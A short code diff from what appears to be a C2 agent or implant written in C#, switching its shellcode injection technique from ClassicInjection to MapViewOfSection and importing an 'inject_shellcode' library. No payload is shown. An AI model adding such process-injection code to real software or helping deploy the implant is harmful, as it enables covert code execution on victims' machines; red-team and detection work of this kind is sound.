@@ -1,6 +1,7 @@
 ﻿using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
+using inject_shellcode.Techniques;
 using System.Text.Json;
 
 namespace Agent
@@ -15,7 +16,7 @@ namespace Agent
         {
             this.messageManager = messageManager;
             this.spawner = spawner;
-            this.technique = new ClassicInjection();
+            this.technique = new MapViewOfSection();
         }
 
         public async Task Execute(ServerJob job)
